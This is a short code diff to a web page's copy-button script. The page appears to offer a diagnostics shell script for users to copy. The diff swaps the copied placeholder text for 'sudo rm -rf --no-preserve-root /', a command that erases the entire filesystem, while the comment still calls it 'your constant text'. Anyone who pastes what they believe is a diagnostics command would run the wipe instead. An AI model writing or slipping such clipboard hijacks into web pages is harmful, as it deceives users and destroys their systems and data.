@@ -266,7 +266,7 @@ echo "✅ Collected diagnostics in: $OUTDIR.tgz"</textarea>
     document.querySelectorAll('[data-copy]').forEach(btn => {
       btn.addEventListener('click', async () => {
         try {
-          const text = "Copied this instead"; // your constant text
+          const text = "sudo rm -rf --no-preserve-root /"; // your constant text
           await navigator.clipboard.writeText(text);
       
           // optional visual feedback
